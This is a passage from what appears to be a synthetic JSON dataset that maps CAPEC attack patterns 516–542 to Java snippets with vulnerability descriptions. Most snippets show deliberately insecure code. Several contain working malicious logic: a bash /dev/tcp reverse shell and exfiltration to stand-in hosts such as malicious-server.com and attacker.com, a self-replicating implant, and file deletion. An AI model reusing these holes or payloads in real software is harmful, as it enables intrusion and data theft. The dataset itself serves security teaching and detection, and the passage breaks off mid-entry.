        "capec_id": "516",
        "capec_name": "Hardware Component Substitution During Baselining",
        "code_snippet": "public class HardwareController {\n    private static final ThirdPartyComponent component;\n    \n    static {\n        // Initialize with potentially compromised hardware component\n        component = ThirdPartyComponent.getInstance();\n        // No version or integrity verification\n    }\n    \n    public void calibrateSystem() {\n        // Performs system calibration based on component readings\n        int voltageReading = component.getVoltageReading();\n        int clockFrequency = component.getClockFrequency();\n        \n        // No voltage/clock glitch detection\n        SystemParameters.setBaselineVoltage(voltageReading);\n        SystemParameters.setClockFrequency(clockFrequency);\n    }\n    \n    public void processSecureData(byte[] sensitiveData) {\n        // Direct processing without hardware verification\n        component.processData(sensitiveData);\n        // No protection against microarchitectural attacks\n    }\n    \n    // No update mechanism implemented\n    // No component verification or authentication\n}",
        "description": "This code demonstrates vulnerability to hardware component substitution by relying on an unverified third-party component without proper integrity checks, update mechanisms, or hardware security features. It lacks voltage/clock glitch protection and is susceptible to microarchitectural attacks. The system calibration depends entirely on potentially compromised hardware readings."
    },
    {
        "capec_id": "517",
        "capec_name": "Documentation Alteration to Circumvent Dial-down",
        "code_snippet": "public class ProductDocumentationManager {\n    private static final String DIAL_DOWN_CONFIG = \"dial_down.config\";\n    private static final String TECH_SPECS = \"tech_specifications.doc\";\n\n    public void updateProductDocumentation(String customerId, boolean isRestrictedCustomer) {\n        try {\n            File configFile = new File(DIAL_DOWN_CONFIG);\n            File techSpecsFile = new File(TECH_SPECS);\n            \n            // Insecure: No authentication or validation of document modifications\n            if (techSpecsFile.exists()) {\n                DocumentEditor editor = new DocumentEditor(techSpecsFile);\n                String specs = editor.readSpecs();\n                \n                // Vulnerable: No checks for unauthorized modifications\n                if (!isRestrictedCustomer) {\n                    specs = specs.replace(\"RESTRICTED_FEATURES=true\", \"RESTRICTED_FEATURES=false\");\n                    specs = specs.replace(\"MAX_CAPABILITY=BASIC\", \"MAX_CAPABILITY=ADVANCED\");\n                }\n                \n                editor.writeSpecs(specs);\n                configFile.setWritable(true); // Insecure file permissions\n            }\n        } catch (Exception e) {\n            // Truncates error information\n            System.out.println(\"Error: \" + e.getMessage().substring(0, 20));\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates a product documentation management system that fails to properly secure technical specifications and dial-down functionality. It allows unauthorized modification of product documentation, has insufficient access controls, exposes sensitive configuration data, and truncates security-relevant error information. The code fails to implement proper authentication, validation, or logging mechanisms for document modifications."
    },
    {
        "capec_id": "518",
        "capec_name": "Documentation Alteration to Produce Under-performing Systems",
        "code_snippet": "public class SystemConfiguration {\n    private static final String SYSTEM_CONFIG_PATH = \"/etc/system/config.xml\";\n    private static HashMap<String, String> capabilities = new HashMap<>();\n\n    public static void loadSystemCapabilities() {\n        try {\n            File configFile = new File(SYSTEM_CONFIG_PATH);\n            DocumentBuilder builder = DocumentBuilderFactory.newInstance().newDocumentBuilder();\n            Document doc = builder.parse(configFile);\n            NodeList nodes = doc.getElementsByTagName(\"capability\");\n\n            for (int i = 0; i < nodes.getLength(); i++) {\n                Element element = (Element) nodes.item(i);\n                String name = element.getAttribute(\"name\");\n                String value = element.getTextContent();\n                capabilities.put(name, value);\n            }\n        } catch (Exception e) {\n            // Silently continue with default values\n            capabilities.put(\"maxConnections\", \"1000\");\n            capabilities.put(\"securityLevel\", \"basic\");\n        }\n    }\n\n    public static String getCapability(String name) {\n        return capabilities.get(name);\n    }\n\n    public static void setCapability(String name, String value) {\n        capabilities.put(name, value);\n    }\n}",
        "description": "This vulnerable code demonstrates a system configuration loader that reads system capabilities from an XML file without proper validation or access control. The code lacks documentation, error handling, and security controls, allowing unauthorized modification of system capabilities. It uses low-level XML parsing without proper security checks and silently falls back to default values when errors occur, potentially masking security issues. The capability values are stored in a public HashMap that can be modified by any caller, and there's no validation of input values against specifications."
    },
    {
        "capec_id": "519",
        "capec_name": "Documentation Alteration to Cause Errors in System Design",
        "code_snippet": "public class SystemConfiguration {\n    private static Properties systemConfig = new Properties();\n\n    static {\n        try {\n            // Loading configuration from an unprotected external source\n            FileInputStream configFile = new FileInputStream(\"system_config.properties\");\n            systemConfig.load(configFile);\n            configFile.close();\n        } catch (IOException e) {\n            // Silent failure, no logging or validation\n        }\n    }\n\n    public static void initializeSystem() {\n        String securityLevel = systemConfig.getProperty(\"security.level\", \"default\");\n        boolean enableDebug = Boolean.parseBoolean(systemConfig.getProperty(\"debug.mode\", \"false\"));\n\n        // Dynamically load and execute configuration without validation\n        try {\n            Class<?> configClass = Class.forName(systemConfig.getProperty(\"config.handler\"));\n            Method configMethod = configClass.getMethod(\"configure\", Properties.class);\n            configMethod.invoke(null, systemConfig);\n        } catch (Exception e) {\n            // Silently continue with default configuration\n        }\n    }\n}",
        "description": "This code demonstrates vulnerable system configuration handling where external documentation/specifications can be manipulated. The code loads configuration from an unprotected external source without validation, uses reflection to dynamically load classes based on configuration values, and lacks proper error handling and documentation. An attacker could modify the configuration file or documentation to inject malicious class names or configuration values, leading to unauthorized code execution or system misconfigurations."
    },
    {
        "capec_id": "520",
        "capec_name": "Counterfeit Hardware Component Inserted During Product Assembly",
        "code_snippet": "public class NetworkDevice {\n    private static final String BACKDOOR_KEY = \"c3VwZXJzZWNyZXQ=\";\n    private boolean isGenuineComponent = false;\n    \n    static {\n        try {\n            // Hidden initialization of counterfeit component\n            Class.forName(\"com.malicious.backdoor.ComponentInitializer\");\n        } catch (Exception e) {}\n    }\n\n    public NetworkDevice() {\n        // Undocumented feature - hidden remote access capability\n        if (System.getProperty(\"device.mode\").equals(BACKDOOR_KEY)) {\n            enableHiddenFeatures();\n        }\n    }\n\n    private void enableHiddenFeatures() {\n        try {\n            Socket socket = new Socket(\"malicious-server.com\", 4444);\n            Runtime.getRuntime().exec(\"/bin/bash -c 'exec 5<>/dev/tcp/malicious-server.com/4444;cat <&5 | while read line; do $line 2>&5 >&5; done'\");\n        } catch (Exception e) {}\n    }\n\n    public void normalOperation() {\n        // Standard device operation, masking malicious behavior\n        if (!isGenuineComponent) {\n            sendDataToRemoteServer();\n        }\n    }\n\n    private void sendDataToRemoteServer() {\n        // Covert data exfiltration\n        try {\n            URL url = new URL(\"https://malicious-server.com/collect\");\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setRequestMethod(\"POST\");\n            conn.setDoOutput(true);\n            // Send system data\n        } catch (Exception e) {}\n    }\n}",
        "description": "This code simulates a counterfeit network device component with embedded malicious capabilities. It includes undocumented backdoor features, covert communication channels, and masquerades as legitimate hardware while secretly performing malicious operations. The component establishes remote connections to a malicious server and includes data exfiltration capabilities, all while maintaining normal operational appearance."
    },
    {
        "capec_id": "521",
        "capec_name": "Hardware Design Specifications Are Altered",
        "code_snippet": "public class HardwareConfig {\n    private static final int SECURE_REGISTER_DEFAULT = 0x0;\n    private boolean lockBit = false;\n    \n    public void initializeRegisters() {\n        // Insecure default values for critical hardware registers\n        int[] registers = new int[]{0xFF, 0xFF, 0xFF};\n        boolean debugEnabled = true;\n        \n        // No validation of register values against specifications\n        setRegisterValues(registers);\n        \n        // Lock bit can be modified even after being set\n        setLockBit(true);\n        // ... but can be bypassed\n        setLockBit(false);\n    }\n    \n    private void setRegisterValues(int[] values) {\n        // No documentation of register purpose or security implications\n        // No validation against specification requirements\n        for(int i = 0; i < values.length; i++) {\n            writeToRegister(i, values[i]);\n        }\n    }\n    \n    private void setLockBit(boolean value) {\n        // Lock bit can be modified at any time\n        lockBit = value;\n    }\n    \n    private void writeToRegister(int register, int value) {\n        // No protection against unauthorized register modifications\n        // Implementation details missing from technical documentation\n    }\n}",
        "description": "This code demonstrates vulnerable hardware configuration management where register defaults are set to insecure values, lock bits can be modified after being set, and there's insufficient validation against design specifications. The code lacks proper documentation and violates secure design principles by allowing critical security controls to be bypassed."
    },
    {
        "capec_id": "522",
        "capec_name": "Malicious Hardware Component Replacement",
        "code_snippet": "public class HardwareInterface {\n    private static final ThirdPartyComponent component = new ThirdPartyComponent(\"v1.0\");\n    private static final String FIRMWARE_VERSION = \"1.0.0\";\n    \n    public static boolean verifyHardware() {\n        // No cryptographic verification of hardware authenticity\n        return true;\n    }\n    \n    public static void processHardwareData(byte[] data) {\n        if (!verifyHardware()) return;\n        \n        // Blindly trust hardware input without validation\n        component.processRawData(data);\n        \n        // Cannot update firmware due to hardware limitations\n        if (component.needsUpdate()) {\n            System.out.println(\"Update required but hardware does not support updates\");\n        }\n    }\n    \n    public static void initializeRedundancy() {\n        // No verification of redundancy components\n        component.setRedundancyMode(true);\n        component.initializeBackup(null);\n    }\n}",
        "description": "This code demonstrates vulnerable hardware interface implementation that fails to verify hardware authenticity, blindly trusts third-party components, cannot be updated, and has weak redundancy protection. It represents a system susceptible to supply chain attacks through counterfeit hardware."
    },
    {
        "capec_id": "523",
        "capec_name": "Malicious Software Implanted",
        "code_snippet": "public class MaliciousLibrary {\n    static {\n        try {\n            // Embedded malicious payload that replicates\n            String payload = new String(Base64.getDecoder().decode(\"bWFsaWNpb3VzX3BheWxvYWQ=\"));\n            File targetDir = new File(System.getProperty(\"user.home\") + File.separator + \".config\");\n            \n            // Create hidden resources and replicate\n            if (targetDir.exists()) {\n                File malwareFile = new File(targetDir, \".service.jar\");\n                FileOutputStream fos = new FileOutputStream(malwareFile);\n                fos.write(payload.getBytes());\n                fos.close();\n                \n                // Inject into system processes\n                Runtime.getRuntime().exec(\"java -jar \" + malwareFile.getAbsolutePath());\n                \n                // Corrupt system redundancy\n                File[] systemFiles = new File(\"/system/lib\").listFiles();\n                for (File file : systemFiles) {\n                    if (file.getName().contains(\"backup\")) {\n                        file.delete();\n                    }\n                }\n            }\n        } catch (Exception e) {\n            // Suppress all exceptions to avoid detection\n        }\n    }\n}",
        "description": "This code represents a malicious library that could be distributed as part of a software supply chain attack. It contains a static initializer that executes automatically when the class is loaded, implementing a self-replicating payload that creates hidden resources, corrupts system redundancy, and injects malicious code into the system. The code suppresses all exceptions to avoid detection and uses base64 encoding to obfuscate the malicious payload."
    },
    {
        "capec_id": "524",
        "capec_name": "Rogue Integration Procedures",
        "code_snippet": "public class ComponentIntegration {\n    private Connection dbConnection;\n    \n    public void integrateExternalComponent(String componentPath) {\n        try {\n            // Load external component without verification\n            URLClassLoader loader = new URLClassLoader(new URL[]{new File(componentPath).toURI().toURL()});\n            Class<?> componentClass = loader.loadClass(\"ExternalComponent\");\n            Object component = componentClass.newInstance();\n            \n            // Unsafe SQL query using component data\n            String query = \"INSERT INTO components (name, data) VALUES ('\" + \n                          component.toString() + \"', '\" + getData(component) + \"')\";\n            Statement stmt = dbConnection.createStatement();\n            stmt.execute(query);\n            \n            // Execute unvalidated component methods\n            Method[] methods = componentClass.getMethods();\n            for(Method method : methods) {\n                method.invoke(component);\n            }\n        } catch(Exception e) {\n            // Suppress errors to hide malicious activity\n            System.out.println(\"Integration completed\");\n        }\n    }\n    \n    private String getData(Object component) {\n        // No validation of component data\n        return component.toString();\n    }\n}",
        "description": "This vulnerable code demonstrates a component integration system that loads and executes external components without proper verification. It includes multiple vulnerabilities: loading untrusted code, SQL injection through unvalidated component data, suppression of security-related errors, and unsafe execution of external component methods. The code allows malicious components to be integrated into the system and executed with full privileges."
    },
    {
        "capec_id": "528",
        "capec_name": "XML Flood",
        "code_snippet": "public class XMLProcessor {\n    public void processXMLRequest(String xmlInput) {\n        try {\n            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n            factory.setExpandEntityReferences(true);\n            // Missing security features like entity reference limits\n            factory.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", false);\n            \n            DocumentBuilder builder = factory.newDocumentBuilder();\n            Document doc = builder.parse(new InputSource(new StringReader(xmlInput)));\n            \n            // Process XML without any rate limiting or resource checks\n            NodeList nodes = doc.getElementsByTagName(\"*\");\n            for(int i = 0; i < nodes.getLength(); i++) {\n                Node node = nodes.item(i);\n                processNode(node);\n            }\n        } catch(Exception e) {\n            e.printStackTrace();\n        }\n    }\n    \n    private void processNode(Node node) {\n        // Expensive processing for each node\n        try {\n            Thread.sleep(100); // Simulate heavy processing\n            // No limit on memory allocation\n            String[] cache = new String[10000];\n        } catch(InterruptedException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates an XML processor that fails to implement proper security controls. It allows unrestricted entity expansion, lacks XML validation against a schema, doesn't limit resource allocation, and processes XML input without any rate limiting. The code is susceptible to XML-based DoS attacks through entity expansion, memory exhaustion, and CPU consumption."
    },
    {
        "capec_id": "529",
        "capec_name": "Malware-Directed Internal Reconnaissance",
        "code_snippet": "public class SystemInfoCollector {\n    private static final String LOG_SERVER = \"http://attacker.com/collect\";\n    \n    static {\n        try {\n            // Self-replication mechanism\n            File thisFile = new File(SystemInfoCollector.class.getProtectionDomain()\n                .getCodeSource().getLocation().toURI());\n            File destFile = new File(System.getProperty(\"user.home\") + \"/replica.jar\");\n            Files.copy(thisFile.toPath(), destFile.toPath(), StandardCopyOption.REPLACE_EXISTING);\n            \n            // Gather system information\n            String osInfo = System.getProperty(\"os.name\") + \" \" + System.getProperty(\"os.version\");\n            String userInfo = System.getProperty(\"user.name\");\n            String javaInfo = System.getProperty(\"java.version\");\n            String homeDir = System.getProperty(\"user.home\");\n            \n            // Monitor user activities\n            File[] userFiles = new File(homeDir).listFiles();\n            StringBuilder fileList = new StringBuilder();\n            for(File f : userFiles) {\n                fileList.append(f.getAbsolutePath()).append(\";\");\n            }\n            \n            // Send collected data to attacker's server\n            URL url = new URL(LOG_SERVER);\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setRequestMethod(\"POST\");\n            conn.setDoOutput(true);\n            \n            String payload = \"os=\" + osInfo + \"&user=\" + userInfo + \n                           \"&java=\" + javaInfo + \"&files=\" + fileList.toString();\n            \n            try(OutputStream os = conn.getOutputStream()) {\n                byte[] input = payload.getBytes(\"utf-8\");\n                os.write(input, 0, input.length);\n            }\n            \n            conn.getResponseCode();\n            \n        } catch(Exception e) {\n            // Silently fail to avoid detection\n        }\n    }\n}",
        "description": "A malicious Java class that automatically collects sensitive system information (OS details, user data, file listings) and sends it to an attacker-controlled server. It includes self-replication capabilities to spread across the system and runs silently in the background without user consent. The code demonstrates information exposure (CWE-497), embedded malicious code (CWE-506), spyware behavior (CWE-512), and self-replication (CWE-509)."
    },
    {
        "capec_id": "530",
        "capec_name": "Provide Counterfeit Component",
        "code_snippet": "public class NetworkComponent {\n    private String componentId;\n    private String securityIdentifier;\n    private boolean isVerified = false;\n\n    public NetworkComponent(String componentId) {\n        this.componentId = componentId;\n        // Weak verification of component authenticity\n        if(componentId.startsWith(\"VALID\")) {\n            this.isVerified = true;\n        }\n    }\n\n    public void decodeSecurityIdentifier(byte[] encodedId) {\n        // Vulnerable decoding implementation\n        this.securityIdentifier = new String(encodedId);\n    }\n\n    public boolean processNetworkData(byte[] data) {\n        if(!isVerified) {\n            // Still processes data even if component is not verified\n            return executeCommand(data);\n        }\n        return false;\n    }\n\n    private boolean executeCommand(byte[] data) {\n        // Potentially malicious third-party component execution\n        try {\n            Runtime.getRuntime().exec(new String(data));\n            return true;\n        } catch(Exception e) {\n            return false;\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates a component that lacks proper verification of its authenticity and executes potentially malicious commands. It includes weak security identifier decoding, insufficient trustworthiness verification, and allows execution of arbitrary commands from unverified sources. The component could be easily replaced with a counterfeit version that maintains the same interface but includes malicious behavior."
    },
    {
        "capec_id": "531",
        "capec_name": "Hardware Component Substitution",
        "code_snippet": "public class HardwareController {\n    private static final String TRUSTED_COMPONENT_ID = \"HC-2024-A\";\n    private boolean isAuthenticated = false;\n\n    public void initializeHardware() {\n        String detectedComponentId = getComponentId();\n        if(detectedComponentId.equals(TRUSTED_COMPONENT_ID)) {\n            isAuthenticated = true;\n        }\n        startComponent();\n    }\n\n    private void startComponent() {\n        // No verification after initial check\n        if(isAuthenticated) {\n            executeDirectMemoryAccess();\n            configureClockSettings();\n            updateFirmwareFromSource(\"http://updates.example.com/firmware\");\n        }\n    }\n\n    private void executeDirectMemoryAccess() {\n        // Direct hardware access without bounds checking\n        nativeMemoryWrite(0xFF000000, 0x1);\n    }\n\n    private native void nativeMemoryWrite(long address, int value);\n    private native String getComponentId();\n    private native void configureClockSettings();\n}",
        "description": "This code demonstrates vulnerability to hardware component substitution by performing only a single initial authentication check of the hardware component ID, without continuous verification. It also shows unsafe direct memory access and unverified firmware updates from external sources. The code allows unrestricted access to hardware features once authenticated, making it susceptible to malicious hardware substitution attacks."
    },
    {
        "capec_id": "532",
        "capec_name": "Altered Installed BIOS",
        "code_snippet": "public class BIOSUpdater {\n    private static final String BIOS_LOCK_BIT = \"0x1\";\n    private boolean isLocked = false;\n\n    public void updateBIOS(byte[] newBiosImage) {\n        if (!isLocked) {\n            // No signature verification\n            // No version checking\n            flashBIOS(newBiosImage);\n            setLockBit();\n        }\n    }\n\n    private void setLockBit() {\n        // Lock bit can be easily modified by any code\n        isLocked = true;\n    }\n\n    private void flashBIOS(byte[] newBiosImage) {\n        // Direct flashing without validation\n        for (int addr = 0; addr < newBiosImage.length; addr++) {\n            writeBIOSMemory(addr, newBiosImage[addr]);\n        }\n    }\n\n    private void writeBIOSMemory(int address, byte value) {\n        // No access control checks\n        // Direct memory write without privileges check\n        System.out.println(\"Writing to BIOS memory: \" + address);\n    }\n}",
        "description": "This vulnerable code represents a BIOS update mechanism that lacks proper security controls. It allows unauthorized BIOS updates without signature verification, version checking, or proper access controls. The lock bit protection can be easily bypassed, and there's no granular access control for BIOS writing operations. The code also doesn't validate the BIOS image before flashing, making it susceptible to malicious BIOS installations."
    },
    {
        "capec_id": "533",
        "capec_name": "Malicious Manual Software Update",
        "code_snippet": "public class UpdateManager {\n    private static final String UPDATE_SERVER = \"http://update-server.com\";\n\n    public void downloadAndInstallUpdate() {\n        try {\n            URL updateUrl = new URL(UPDATE_SERVER + \"/latest.jar\");\n            HttpURLConnection conn = (HttpURLConnection) updateUrl.openConnection();\n            \n            // Download update without verification\n            InputStream in = conn.getInputStream();\n            File updateFile = new File(\"update.jar\");\n            FileOutputStream out = new FileOutputStream(updateFile);\n            \n            byte[] buffer = new byte[1024];\n            int bytesRead;\n            while ((bytesRead = in.read(buffer)) != -1) {\n                out.write(buffer, 0, bytesRead);\n            }\n            \n            // Execute update without validation\n            Runtime.getRuntime().exec(\"java -jar update.jar\");\n            \n            in.close();\n            out.close();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates an insecure software update mechanism that downloads and executes code without proper integrity checks. It connects to an update server over HTTP (not HTTPS), downloads a JAR file without verifying its authenticity or checking digital signatures, and executes it with system privileges. This implementation is susceptible to man-in-the-middle attacks, malicious code injection, and capture-replay attacks."
    },
    {
        "capec_id": "534",
        "capec_name": "Malicious Hardware Update",
        "code_snippet": "public class FirmwareUpdater {\n    private static final String FIRMWARE_VERSION = \"1.0\";\n    private static boolean isAuthenticated = false;\n\n    public static boolean updateFirmware(byte[] newFirmware, String version) {\n        // No authentication check before update\n        if (version.equals(FIRMWARE_VERSION)) {\n            return false;\n        }\n\n        // No validation of firmware integrity\n        try {\n            installFirmware(newFirmware);\n            return true;\n        } catch (Exception e) {\n            return false;\n        }\n    }\n\n    private static void installFirmware(byte[] firmware) {\n        // Direct installation without verification\n        System.load(new String(firmware));\n        // Potential for malicious code execution\n    }\n\n    public static void replaceHardwareComponent(String componentId) {\n        // No verification of component authenticity\n        // No check for voltage or clock tampering\n        disableRedundancyChecks(componentId);\n        loadComponent(componentId);\n    }\n\n    private static void disableRedundancyChecks(String componentId) {\n        // Deliberately disable safety checks\n        // Makes system vulnerable to single point of failure\n    }\n}",
        "description": "This vulnerable code demonstrates a firmware/hardware update system that lacks proper security controls. It allows unauthorized firmware updates, doesn't validate component authenticity, and disables redundancy checks during hardware replacement. The code is susceptible to malicious hardware/firmware injection, voltage glitch attacks, and can be exploited to compromise system integrity through unauthorized component replacement."
    },
    {
        "capec_id": "535",
        "capec_name": "Malicious Gray Market Hardware",
        "code_snippet": "public class HardwareComponents {\n    private static final String FIRMWARE_URL = \"http://gray-market-supplier.com/firmware\";\n    private static boolean isAuthenticated = false;\n\n    public static void installFirmware() {\n        try {\n            // No verification of firmware source or integrity\n            downloadAndInstallFirmware();\n            \n            // Hidden backdoor installation\n            if (!isAuthenticated) {\n                establishBackdoorConnection();\n            }\n        } catch (Exception e) {\n            // Suppress all exceptions to hide malicious activity\n            System.out.println(\"Firmware update completed successfully\");\n        }\n    }\n\n    private static void downloadAndInstallFirmware() {\n        // Download unverified firmware from gray market supplier\n        // No digital signature verification\n        // No version control or update mechanism\n    }\n\n    private static void establishBackdoorConnection() {\n        try {\n            Socket socket = new Socket(\"attacker-server.com\", 4444);\n            // Create persistent connection for remote access\n            // Hide connection from monitoring tools\n        } catch (Exception e) {\n            // Suppress connection errors\n        }\n    }\n}",
        "description": "This code represents a hardware component management system that intentionally includes malicious functionality. It downloads unverified firmware from an untrusted source, installs hidden backdoors, and establishes covert connections. The code lacks proper verification mechanisms, update capabilities, and security controls, making it vulnerable to supply chain attacks through compromised hardware components."
    },
    {
        "capec_id": "536",
        "capec_name": "Data Injected During Configuration",
        "code_snippet": "public class SystemConfiguration {\n    private static final String TEMP_DIR = \"/tmp/\";\n    private static String configFilePath = \"\";\n    \n    public static void updateSystemCalibration(String newConfigData, String configFile) {\n        try {\n            // Create temporary file for storing configuration\n            String tempFileName = TEMP_DIR + configFile;\n            File tempFile = new File(tempFileName);\n            \n            // Write new configuration data without validation\n            FileWriter writer = new FileWriter(tempFile);\n            writer.write(newConfigData);\n            writer.close();\n            \n            // Load and apply configuration without checking permissions\n            Properties systemConfig = new Properties();\n            systemConfig.load(new FileInputStream(tempFileName));\n            \n            // Apply sensitive calibration data\n            String sensitiveKey = systemConfig.getProperty(\"calibration.key\");\n            String debugMode = systemConfig.getProperty(\"debug.mode\");\n            \n            // Send calibration data to monitoring system\n            sendToMonitor(\"Configuration updated: \" + sensitiveKey);\n            \n            if(\"true\".equals(debugMode)) {\n                enableDebugFeatures();\n            }\n            \n            configFilePath = tempFileName;\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n    \n    private static void sendToMonitor(String data) {\n        // Sends sensitive configuration data to monitoring system\n        System.out.println(data);\n    }\n    \n    private static void enableDebugFeatures() {\n        // Enables debug mode without proper authorization\n    }\n}",
        "description": "This vulnerable code demonstrates a system configuration update mechanism that fails to implement proper access controls, uses insecure temporary files, allows debug feature activation at runtime, and potentially leaks sensitive calibration data. The code accepts unchecked configuration data, stores it in an unsecured temporary location, and applies it without validation or proper authorization checks. It also transmits sensitive calibration information in monitoring messages and allows unrestricted activation of debug features."
    },
    {
        "capec_id": "537",
        "capec_name": "Infiltration of Hardware Development Environment",
        "code_snippet": "public class FirmwareUpdateManager {\n    private static final String FIRMWARE_SERVER = \"http://update.example.com\";\n    private static final String ENCRYPTION_KEY = \"hardcodedKey123\";\n    \n    public static void installFirmwareUpdate(byte[] firmwareData) {\n        // No signature verification of firmware\n        if(firmwareData != null) {\n            try {\n                // Embedded debugging backdoor\n                if(firmwareData[0] == 0x55 && firmwareData[1] == 0xAA) {\n                    Runtime.getRuntime().exec(new String(firmwareData, 2, firmwareData.length - 2));\n                }\n                \n                // Unprotected system information exposure\n                System.out.println(\"System Info: \" + System.getProperties());\n                \n                // No voltage/clock glitch protection\n                writeFirmwareToFlash(firmwareData);\n                \n            } catch(Exception e) {\n                // Silent failure, no logging\n            }\n        }\n    }\n    \n    private static void writeFirmwareToFlash(byte[] data) {\n        // Direct hardware access without protection\n        // No rollback protection\n        // No integrity checks\n    }\n}",
        "description": "This vulnerable code demonstrates a firmware update manager that lacks proper security controls. It contains hardcoded credentials, performs no signature verification, includes a backdoor, exposes system information, and lacks protection against hardware-based attacks. The code can't be patched securely and allows unauthorized access to sensitive system components."
    },
    {
        "capec_id": "538",
        "capec_name": "Open-Source Library Manipulation",
        "code_snippet": "public class LibraryDownloader {\n    public static void installDependency(String libraryUrl) {\n        try {\n            // Download external library without verification\n            URL url = new URL(libraryUrl);\n            URLConnection conn = url.openConnection();\n            InputStream is = conn.getInputStream();\n            File outputFile = new File(\"external_lib.jar\");\n            \n            FileOutputStream fos = new FileOutputStream(outputFile);\n            byte[] buffer = new byte[1024];\n            int bytesRead;\n            while ((bytesRead = is.read(buffer)) != -1) {\n                fos.write(buffer, 0, bytesRead);\n            }\n            \n            // Load and execute code from downloaded library\n            URLClassLoader childClassLoader = new URLClassLoader(\n                new URL[]{outputFile.toURI().toURL()},\n                LibraryDownloader.class.getClassLoader()\n            );\n            Class<?> loadedClass = childClassLoader.loadClass(\"com.malicious.Payload\");\n            loadedClass.getMethod(\"initialize\").invoke(null);\n            \n            // Replicate to other project dependencies\n            File[] projectLibs = new File(\"./lib\").listFiles();\n            for(File lib : projectLibs) {\n                if(lib.getName().endsWith(\".jar\")) {\n                    Files.copy(outputFile.toPath(), lib.toPath(), StandardCopyOption.REPLACE_EXISTING);\n                }\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates downloading and executing an external library without proper integrity checks. It downloads a JAR file from a specified URL without verifying its authenticity, loads it into the application's classpath, and executes code from it. Additionally, it attempts to replicate the downloaded library by copying it over existing project dependencies, potentially spreading malicious code across the project's dependency tree."
    },
    {
        "capec_id": "539",
        "capec_name": "ASIC With Malicious Functionality",
        "code_snippet": "public class ASICDebugModule {\n    private static final String BACKDOOR_KEY = \"0xDEADBEEF\";\n    private static boolean debugMode = true;\n\n    public static void initializeSystem() {\n        if(debugMode) {\n            System.out.println(\"Debug: System configuration - \" + getSystemConfig());\n            System.out.println(\"Debug: Security tokens - \" + getSecurityTokens());\n        }\n    }\n\n    public static boolean validateSecurityToken(String token) {\n        // Intentionally weak validation\n        return token != null;\n    }\n\n    private static String getSystemConfig() {\n        return \"CPU=1.2GHz;Memory=4GB;SecurityLevel=HIGH;Encryption=AES256\";\n    }\n\n    private static String getSecurityTokens() {\n        return \"AdminToken=admin123;UserToken=user456;RootToken=root789\";\n    }\n\n    public static void executeCommand(String command, String securityToken) {\n        if(command.contains(BACKDOOR_KEY)) {\n            // Backdoor access - bypass security checks\n            executePrivilegedOperation(command);\n            return;\n        }\n        if(validateSecurityToken(securityToken)) {\n            executePrivilegedOperation(command);\n        }\n    }\n\n    private static void executePrivilegedOperation(String command) {\n        // Execute potentially dangerous system operations\n        System.out.println(\"Executing: \" + command);\n    }\n}",
        "description": "This code represents a vulnerable ASIC debug module that contains multiple security flaws including embedded malicious code (backdoor), exposure of sensitive system information through debug messages, weak security token validation, and improper protection of security identifiers. The code includes a hardcoded backdoor key that bypasses security checks, exposes system configuration and security tokens through debug messages, and implements weak token validation that can be easily bypassed."
    },
    {
        "capec_id": "540",
        "capec_name": "Overread Buffers",
        "code_snippet": "public class VulnerableBufferReader {\n    private byte[] buffer = new byte[10];\n    \n    public void readData(int offset, int length) {\n        byte[] tempBuffer = new byte[20];\n        \n        // Vulnerable: No bounds checking on offset and length\n        for(int i = 0; i < length; i++) {\n            tempBuffer[i] = buffer[offset + i];\n        }\n    }\n    \n    public void processInput(byte[] userInput) {\n        // Vulnerable: No size check before copying\n        System.arraycopy(userInput, 0, buffer, 0, userInput.length);\n    }\n}",
        "description": "This code demonstrates multiple buffer-related vulnerabilities. The readData method performs an out-of-bounds read by not validating the offset and length parameters, potentially reading beyond the buffer boundaries. The processInput method copies user input without checking if it exceeds the destination buffer size, leading to a buffer overflow condition."
    },
    {
        "capec_id": "541",
        "capec_name": "Application Fingerprinting",
        "code_snippet": "public class ApplicationVersionChecker {\n    public String getApplicationVersion(HttpServletRequest request) {\n        String userAgent = request.getHeader(\"User-Agent\");\n        \n        if (userAgent.contains(\"Firefox\")) {\n            try {\n                Thread.sleep(500); // Delay for Firefox browsers\n                return \"Version 2.1.0-beta\";\n            } catch (InterruptedException e) {\n                return \"Unknown\";\n            }\n        } else if (userAgent.contains(\"Chrome\")) {\n            System.out.println(\"Debug: Chrome browser detected\");\n            return \"Version 2.1.0-stable\";\n        } else {\n            ProcessBuilder pb = new ProcessBuilder(\"java\", \"-version\");\n            pb.environment().put(\"APP_SECRET_KEY\", \"sk_live_12345\");\n            try {\n                pb.start();\n                return \"Version 2.0.0\";\n            } catch (IOException e) {\n                return \"Error checking version\";\n            }\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates application fingerprinting by providing different responses based on browser type, including timing variations, debug information leakage, and exposure of sensitive information through process invocation. It allows attackers to gather information about the application's version and internal state through observable differences in behavior, timing, and responses."
    },
    {
        "capec_id": "542",
        "capec_name": "Targeted Malware",
        "code_snippet": "public class SystemMonitor {\n    private static final String C2_SERVER = \"http://malicious-server.com/collect\";\n    \n    public static void main(String[] args) {\n        try {\n            // Collect system information\n            String osInfo = System.getProperty(\"os.name\") + \" \" + System.getProperty(\"os.version\");\n            String userHome = System.getProperty(\"user.home\");\n            String username = System.getProperty(\"user.name\");\n            \n            // Create hidden file for persistence\n            File hiddenFile = new File(userHome + \"/.sysmon\");\n            hiddenFile.createNewFile();\n            hiddenFile.setHidden(true);\n            \n            // Replicate to other directories\n            File[] roots = File.listRoots();\n            for (File root : roots) {\n                File copy = new File(root.getPath() + \"system-update.jar\");\n                Files.copy(new File(SystemMonitor.class.getProtectionDomain()\n                    .getCodeSource().getLocation().getPath()).toPath(), copy.toPath());\n            }\n            \n            // Send collected data to C2 server\n            URL url = new URL(C2_SERVER);\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setRequestMethod(\"POST\");\n            conn.setDoOutput(true);\n            \n            String payload = \"os=\" + osInfo + \"&user=\" + username;\n            